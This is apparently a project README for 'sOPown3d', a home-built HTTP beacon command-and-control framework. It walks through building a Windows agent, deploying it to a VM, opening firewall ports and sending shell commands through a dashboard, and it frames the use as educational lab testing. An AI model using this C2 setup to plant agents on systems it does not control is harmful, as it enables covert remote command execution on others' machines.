# Network Deployment Guide - Windows VM to Local Computer

This guide explains how to connect a Windows VM agent to your local computer's C2 server.

## Overview

Your C2 system uses an **HTTP-based beacon pattern** where:
- **Agent (Windows VM)** initiates all connections
- **Server (Your Computer)** waits for beacons and responds with commands
- Connection is **pull-based** (Agent → Server), never push (Server → Agent)

## Architecture Diagram

```
┌─────────────────────────────────────┐          ┌─────────────────────────────────────┐
│       Windows VM (Agent)            │          │    Your Computer (Server)           │
│  ┌───────────────────────────────┐  │          │  ┌───────────────────────────────┐  │
│  │  agent.exe                    │  │          │  │  Server Process               │  │
│  │                               │  │          │  │  Listening on: 0.0.0.0:8080   │  │
│  │  Every 1-2 seconds:           │  │          │  │                               │  │
│  │                               │  │          │  │  ┌─────────────────────────┐  │  │
│  │  1. Send HTTP POST /beacon ───┼──┼──────────┼──┼─▶│ handleBeacon()         │  │  │
│  │     Body: {hostname, os, ...} │  │          │  │  │ - Save agent to DB     │  │  │
│  │                               │  │          │  │  │ - Check pending cmds   │  │  │
│  │  2. Receive response      ◀───┼──┼──────────┼──┼──│ - Return {} or command │  │  │
│  │     {} or {action, payload}   │  │          │  │  └─────────────────────────┘  │  │
│  │                               │  │          │  │                               │  │
│  │  3. Execute command           │  │          │  │  ┌─────────────────────────┐  │  │
│  │     cmd /c whoami             │  │          │  │  │ PostgreSQL Database     │  │  │
│  │                               │  │          │  │  │ - agents table          │  │  │
│  │  4. Send result POST /ingest ─┼──┼──────────┼──┼─▶│ - command_executions   │  │  │
│  │     Output: "user\admin"      │  │          │  │  └─────────────────────────┘  │  │
│  │                               │  │          │  │                               │  │
│  │  5. Wait (jitter: 1-2s)       │  │          │  │  Dashboard: http://0.0.0.0:8080│
│  │  6. Loop to step 1            │  │          │  │  API: http://0.0.0.0:8080/api │
│  └───────────────────────────────┘  │          │  └───────────────────────────────┘  │
│                                     │          │                                     │
│  IP: 192.168.1.50 (example)         │          │  IP: 192.168.1.100 (example)        │
└─────────────────────────────────────┘          └─────────────────────────────────────┘
         Same Local Network
```

## Key Concepts

### 1. Server Bind Address (Very Important!)

The server can listen on two different addresses:

**`0.0.0.0` (All Network Interfaces)** ✅ Recommended for VM deployment
- Accepts connections from ANY network interface
- Windows VM on LAN can connect ✅
- WiFi, Ethernet, VMs all work ✅
- ⚠️ **Warning**: Anyone on your network can connect!

**`127.0.0.1` (Localhost Only)** 🔒 More secure
- Accepts connections from localhost ONLY
- Windows VM on LAN **CANNOT** connect ❌
- Only same-machine testing works
- More secure for development

**Default in this project**: `0.0.0.0` (network accessible)

### 2. Agent Server URL

The agent needs to know **where** the server is:

**Same machine** (testing):
```bash
$ agent.exe -server http://127.0.0.1:8080
```

**Different machine** (Windows VM):
```bash
$ agent.exe -server http://192.168.1.100:8080
```
Replace `192.168.1.100` with your computer's actual local IP.

### 3. Network Requirements

For Windows VM → Your Computer:
- ✅ Both on same local network (LAN/WiFi)
- ✅ Firewall allows port 8080
- ✅ Server binds to `0.0.0.0`
- ✅ Agent uses correct server IP

## Step-by-Step Setup: Windows VM Deployment

### Prerequisites

- Windows VM (VMware, VirtualBox, Hyper-V, etc.)
- Your computer on same network as VM
- Docker installed on your computer
- Port 8080 not blocked by firewall

---

### Step 1: Find Your Computer's Local IP Address

**On macOS:**
```bash
$ ifconfig | grep "inet " | grep -v 127.0.0.1
# Look for something like: inet 192.168.1.100

# Or simpler:
$ ipconfig getifaddr en0    # WiFi
$ ipconfig getifaddr en1    # Ethernet
```

**On Linux:**
```bash
$ ip addr show | grep "inet " | grep -v 127.0.0.1
# Or:
$ hostname -I
```

**On Windows (if server is on Windows):**
```cmd
C:\> ipconfig
# Look for "IPv4 Address" under your active network adapter
```

**Example result**: `192.168.1.100`

**Note this IP** - you'll use it in Step 5!

---

### Step 2: Configure Server for Network Access

Edit `.env` file (or set environment variable):

```bash
# Open .env file
$ nano .env

# Set SERVER_HOST to 0.0.0.0
SERVER_HOST=0.0.0.0

# Save and exit
```

**Or** set environment variable:
```bash
export SERVER_HOST=0.0.0.0
```

**Or** edit `config.json`:
```json
{
  "server": {
    "host": "0.0.0.0",
    "port": "8080"
  }
}
```

---

### Step 3: Configure Firewall (If Needed)

**macOS:**
```bash
# Check if firewall is enabled
$ sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# If enabled, allow port 8080
# System Settings → Network → Firewall → Firewall Options
# Add rule for your server binary or allow port 8080
```

**Linux (Ubuntu/Debian):**
```bash
$ sudo ufw allow 8080
$ sudo ufw status
```

**Windows:**
```powershell
# Run as Administrator
netsh advfirewall firewall add rule name="C2 Server" dir=in action=allow protocol=TCP localport=8080
```

---

### Step 4: Start Server on Your Computer

```bash
# Terminal 1: Start PostgreSQL
$ just docker-up

# Wait for "PostgreSQL is running" message

# Terminal 2: Start Server
$ DATABASE_URL="postgres://c2user:c2pass@localhost:5433/c2_db?sslmode=disable" just dev-server
```

**Expected Output:**
```
[2026-02-05 17:00:00] [INFO] 🚀 === sOPown3d C2 Server ===
[2026-02-05 17:00:00] [INFO] 🔌 Connecting to PostgreSQL...
[2026-02-05 17:00:00] [INFO] ✓ Database connected (pool: 5-25 connections)
[2026-02-05 17:00:00] [WARN] ⚠️ Server binding to 0.0.0.0 - ACCESSIBLE FROM NETWORK
[2026-02-05 17:00:00] [WARN] ⚠️ Anyone on your network can connect! Use 127.0.0.1 for localhost-only
[2026-02-05 17:00:00] [INFO] 🌐 Server listening on http://0.0.0.0:8080 (all network interfaces)
[2026-02-05 17:00:00] [INFO] 🌐 Access via: http://<YOUR_LOCAL_IP>:8080
```

**Important**: Note the warnings - this is expected for network deployment!

---

### Step 5: Build Agent for Windows

On your computer (macOS/Linux), build the Windows agent:

```bash
$ GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go

# This creates agent.exe for Windows
$ ls -lh agent.exe
-rwxr-xr-x  1 user  staff   8.5M Feb  5 17:00 agent.exe
```

**Alternative**: Use justfile (if available):
```bash
$ just build-agent windows amd64
# Creates: build/windows/agent.exe
```

---

### Step 6: Transfer Agent to Windows VM

**Method 1: Shared Folder (Recommended)**
If your VM has shared folders:
```bash
# Copy to shared folder
$ cp agent.exe /path/to/vm-shared-folder/
```

**Method 2: SCP/Network Transfer**
```bash
$ scp agent.exe user@windows-vm-ip:/path/to/destination/
```

**Method 3: HTTP Download**
Start a simple HTTP server:
```bash
# On your computer
$ python3 -m http.server 8000

# On Windows VM, download via browser:
http://192.168.1.100:8000/agent.exe
```

**Method 4: USB/Cloud**
- Copy to USB drive
- Upload to cloud (Dropbox, Google Drive)
- Download on Windows VM

---

### Step 7: Test Network Connectivity (From Windows VM)

Before running the agent, verify the Windows VM can reach your server:

```cmd
C:\> ping 192.168.1.100

Pinging 192.168.1.100 with 32 bytes of data:
Reply from 192.168.1.100: bytes=32 time=1ms TTL=64

# Should see replies ✅
```

**Test HTTP connection:**
```cmd
C:\> curl http://192.168.1.100:8080/api/stats

# Should return JSON with stats ✅
```

**If ping fails:**
- Check both machines are on same network
- Check firewall settings
- Verify IP address is correct
- Check VM network mode (Bridged, NAT, Host-only)

---

### Step 8: Run Agent on Windows VM

```cmd
C:\> agent.exe -server http://192.168.1.100:8080

Expected output:
=== sOPown3d Agent ===
Agent ID: WINDOWS-VM-NAME
En attente de commandes...
[Heartbeat #1] Next check in: 1.52s
[Heartbeat #2] Next check in: 1.78s
```

**Replace `192.168.1.100`** with your computer's actual IP from Step 1!

---

### Step 9: Verify Connection

**On Server (Your Computer)** - Watch the logs:
```
[INFO] 📥 Beacon received: agent=WINDOWS-VM-NAME os=windows
[INFO] 💾 Agent 'WINDOWS-VM-NAME' info updated
```

**On Dashboard** - Open http://localhost:8080 (or http://192.168.1.100:8080):
- Statistics should show: "Total Agents: 1"
- Agent should appear in "Active Agents" table
- Status badge should be green: "🟢 Active"

**Via API** - Query from your computer:
```bash
$ curl http://localhost:8080/api/agents | jq
{
  "agents": [
    {
      "agent_id": "WINDOWS-VM-NAME",
      "hostname": "WINDOWS-VM-NAME",
      "os": "windows",
      "username": "Administrator",
      "is_active": true,
      ...
    }
  ],
  "total": 1
}
```

---

### Step 10: Send a Command

**Via Dashboard:**
1. Open http://localhost:8080
2. Select agent from dropdown: "WINDOWS-VM-NAME (windows)"
3. Select command: "shell"
4. Enter payload: `whoami`
5. Click "Send Command"

**Watch Agent Terminal:**
```
[Heartbeat #5] Next check in: 1.34s
Exécute: whoami
WINDOWS-VM\Administrator
```

**Check Results:**
- Dashboard "Recent Executions" shows the command
- API: `curl http://localhost:8080/api/executions | jq`
- Database: `just docker-psql` → `SELECT * FROM command_executions;`

---

## Configuration Reference

### Server Bind Addresses

| Value | Description | Use Case | Security |
|-------|-------------|----------|----------|
| `0.0.0.0` | All interfaces | Windows VM, network agents | ⚠️ Less secure |
| `127.0.0.1` | Localhost only | Same-machine testing | 🔒 More secure |
| Specific IP | Single interface | Advanced use | 🔒 Controlled |

### Agent Server URLs

| URL | Description | Use Case |
|-----|-------------|----------|
| `http://127.0.0.1:8080` | Localhost | Testing on same machine |
| `http://192.168.1.100:8080` | Local IP | Windows VM on LAN |
| `http://your-domain.com:8080` | Domain name | Public/cloud deployment |
| `https://...` | HTTPS (future) | Encrypted communication |

### Environment Variables

**Server:**
```bash
SERVER_HOST=0.0.0.0     # Bind to all interfaces (network accessible)
# OR
SERVER_HOST=127.0.0.1   # Bind to localhost only (secure)

PORT=8080               # Server port
```

**Agent:**
```bash
# Agent uses command-line flag only (simpler, more flexible)
$ agent.exe -server http://192.168.1.100:8080
```

---

## Deployment Scenarios

### Scenario 1: Testing on Same Machine (Localhost)

**Server:**
```bash
SERVER_HOST=127.0.0.1 just dev-server
```

**Agent:**
```bash
just dev-agent
# Uses default: http://127.0.0.1:8080
```

**Works for**: Quick testing, development

---

### Scenario 2: Windows VM on Same Network (Recommended)

**Server (Your Computer):**
```bash
# Find your IP first
$ ipconfig getifaddr en0
192.168.1.100

# Start server
SERVER_HOST=0.0.0.0 DATABASE_URL="postgres://c2user:c2pass@localhost:5433/c2_db?sslmode=disable" just dev-server
```

**Agent (Windows VM):**
```cmd
C:\> agent.exe -server http://192.168.1.100:8080
```

**Works for**: Windows VM testing, lab environments

---

### Scenario 3: Multiple VMs/Agents

**Server (Your Computer):**
```bash
SERVER_HOST=0.0.0.0 just dev-server
```

**Agent 1 (Windows VM):**
```cmd
C:\> agent.exe -server http://192.168.1.100:8080
```

**Agent 2 (Linux VM):**
```bash
$ ./agent -server http://192.168.1.100:8080
```

**Agent 3 (macOS):**
```bash
$ ./agent -server http://192.168.1.100:8080
```

All agents connect to same server!

---

## Troubleshooting

### Problem: Agent can't connect to server

**Symptoms:**
```
beacon error: dial tcp 192.168.1.100:8080: i/o timeout
```

**Solutions:**

1. **Verify Server IP:**
   ```bash
   # On your computer, re-check IP
   $ ifconfig | grep "inet "
   ```

2. **Verify Server is Running:**
   ```bash
   $ curl http://localhost:8080/api/stats
   # Should return JSON ✅
   ```

3. **Check Server Bind Address:**
   Look for in server logs:
   ```
   [INFO] 🌐 Server listening on http://0.0.0.0:8080
   ```
   If you see `127.0.0.1`, change `SERVER_HOST=0.0.0.0`

4. **Test from VM:**
   ```cmd
   C:\> ping 192.168.1.100
   # Should succeed
   
   C:\> curl http://192.168.1.100:8080/api/stats
   # Should return JSON
   ```

5. **Check Firewall:**
   ```bash
   # On your computer (macOS)
   $ sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
   
   # If enabled, temporarily disable to test
   $ sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
   # Test, then re-enable:
   $ sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
   ```

6. **Check VM Network Mode:**
   - **Bridged Mode**: VM gets own IP on LAN ✅ (Recommended)
   - **NAT Mode**: VM behind NAT, may need port forwarding
   - **Host-Only**: Isolated network, may need special config

---

### Problem: "Connection refused"

**Symptoms:**
```
beacon error: connection refused
```

**Cause**: Server not running or wrong port

**Solution:**
```bash
# Check server is running
$ ps aux | grep server

# Check correct port
$ lsof -i :8080

# Restart server
$ DATABASE_URL="..." just dev-server
```

---

### Problem: "Address already in use"

**Symptoms:**
```
[ERROR] ❌ Server error: listen tcp 0.0.0.0:8080: bind: address already in use
```

**Cause**: Another process using port 8080

**Solution:**
```bash
# Find process using port 8080
$ lsof -i :8080

# Kill it
$ kill -9 <PID>

# Or use different port
$ PORT=9090 just dev-server
```

---

### Problem: Agent connects but no commands execute

**Symptoms:**
- Agent shows in dashboard as "Active" ✅
- Commands sent but not executed ❌

**Solution:**
1. Check agent terminal for command execution logs
2. Verify agent is still running (didn't crash)
3. Wait for next beacon (1-2 seconds)
4. Check server logs for "Command delivered" message
5. Verify command syntax is correct

---

## Security Considerations

### ⚠️ Important Warnings

**When binding to `0.0.0.0`:**

1. **No Authentication**: Anyone who knows your IP can:
   - View the dashboard
   - Send commands to agents
   - Access the API

2. **Plaintext HTTP**: All traffic is unencrypted:
   - Commands visible on network
   - Outputs visible on network
   - Agent info transmitted in clear

3. **Network Exposure**: The server is accessible to:
   - Anyone on your local network
   - Anyone who can route to your IP
   - All VMs/containers on your host

### 🔒 Security Best Practices

**For Educational/Testing Use:**
1. ✅ Use on isolated/private networks only
2. ✅ Don't expose to public internet
3. ✅ Use `127.0.0.1` when possible
4. ✅ Turn off when not in use
5. ✅ Monitor who connects (check logs)

**For Production Use (Not Recommended for this project):**
1. Add HTTPS/TLS encryption
2. Implement authentication (API keys, tokens)
3. Use VPN or SSH tunnels
4. Implement IP whitelisting
5. Add rate limiting
6. Use proper firewall rules

---

## VM Network Configuration

### VMware Workstation/Fusion

**Bridged Mode** (Recommended):
- VM gets own IP on your LAN
- Acts like physical machine on network
- Agent can reach server directly
- Server IP: Your computer's LAN IP

**NAT Mode**:
- VM behind NAT
- May need port forwarding from host to VM
- More complex setup
- Use Bridged instead if possible

**Host-Only**:
- Isolated network between host and VM
- Server and agent can communicate
- Requires specific host-only network configuration

### VirtualBox

Similar modes:
- **Bridged Adapter**: Same as VMware Bridged (recommended)
- **NAT**: VM behind NAT
- **Host-Only Adapter**: Isolated network

**Recommended**: Bridged Adapter

---

## Testing Checklist

Before deploying to Windows VM, verify:

- [ ] Server IP address identified (Step 1)
- [ ] Server configured for network access (`SERVER_HOST=0.0.0.0`)
- [ ] PostgreSQL running (`just docker-up`)
- [ ] Server running (`just dev-server`)
- [ ] Server logs show: "Server listening on http://0.0.0.0:8080"
- [ ] Dashboard accessible from browser
- [ ] Firewall allows port 8080
- [ ] VM can ping server IP
- [ ] VM can curl server API endpoint
- [ ] agent.exe built for Windows
- [ ] agent.exe transferred to VM
- [ ] Agent runs with correct server URL

---

## Quick Reference Commands

### Find Your Local IP
```bash
# macOS
$ ipconfig getifaddr en0

# Linux  
$ hostname -I | awk '{print $1}'

# Windows
$ ipconfig | findstr IPv4
```

### Start Server (Network Mode)
```bash
$ SERVER_HOST=0.0.0.0 DATABASE_URL="postgres://c2user:c2pass@localhost:5433/c2_db?sslmode=disable" just dev-server
```

### Start Server (Localhost Only - Secure)
```bash
$ SERVER_HOST=127.0.0.1 DATABASE_URL="postgres://c2user:c2pass@localhost:5433/c2_db?sslmode=disable" just dev-server
```

### Build Windows Agent
```bash
$ GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go
```

### Run Agent (Windows VM)
```cmd
C:\> agent.exe -server http://192.168.1.100:8080
```

### Test Connectivity
```bash
# From Windows VM
C:\> ping 192.168.1.100
C:\> curl http://192.168.1.100:8080/api/stats
```

---

## Advanced: Dynamic Server URL Discovery

For advanced deployments, you could:

### Option 1: Use DNS
```bash
# Set up local DNS entry
# Agent uses: -server http://c2-server.local:8080
```

### Option 2: Environment Variable on Agent
```cmd
C:\> set C2_SERVER=http://192.168.1.100:8080
C:\> agent.exe
```
(Would require agent code modification)

### Option 3: Config File
Create `agent-config.json` on Windows VM:
```json
{
  "server_url": "http://192.168.1.100:8080",
  "jitter_min": 1.0,
  "jitter_max": 2.0
}
```
(Would require agent code modification)

**Current Implementation**: Uses `-server` flag only (simpler and works great!)

---

## Example: Complete Walkthrough

### Your Computer (macOS - IP: 192.168.1.100)

```bash
# Terminal 1
$ just docker-up
✓ PostgreSQL is running on localhost:5433

# Terminal 2
$ export SERVER_HOST=0.0.0.0
$ export DATABASE_URL="postgres://c2user:c2pass@localhost:5433/c2_db?sslmode=disable"
$ just dev-server

[INFO] 🚀 === sOPown3d C2 Server ===
[WARN] ⚠️ Server binding to 0.0.0.0 - ACCESSIBLE FROM NETWORK
[INFO] 🌐 Server listening on http://0.0.0.0:8080 (all network interfaces)
```

### Windows VM (IP: 192.168.1.50)

```cmd
C:\> agent.exe -server http://192.168.1.100:8080

=== sOPown3d Agent ===
Agent ID: WINDOWS-PC
[Heartbeat #1] Next check in: 1.52s
```

### Dashboard (Your Computer)

```bash
$ open http://localhost:8080

# You should see:
# - Total Agents: 1
# - WINDOWS-PC listed as Active
# - Green status badge
```

### Send Command (Dashboard)

1. Select agent: "WINDOWS-PC (windows)"
2. Command: "shell"
3. Payload: `whoami`
4. Click "Send Command"

**Agent executes:**
```
Exécute: whoami
WINDOWS-PC\Administrator
```

**Result stored in PostgreSQL!** ✅

---

## Summary

**Key Configuration:**

✅ **Server** - Configurable via `SERVER_HOST` environment variable:
- `0.0.0.0` = Network accessible (for Windows VM)
- `127.0.0.1` = Localhost only (for security)

✅ **Agent** - Uses `-server` flag:
- Same machine: `-server http://127.0.0.1:8080`
- Windows VM: `-server http://192.168.1.100:8080`
- Flexible and simple!

✅ **Security** - Clear warnings when binding to 0.0.0.0

✅ **Documentation** - Complete with examples

**The connection between agent and server is now fully configurable and ready for Windows VM deployment!** 🚀
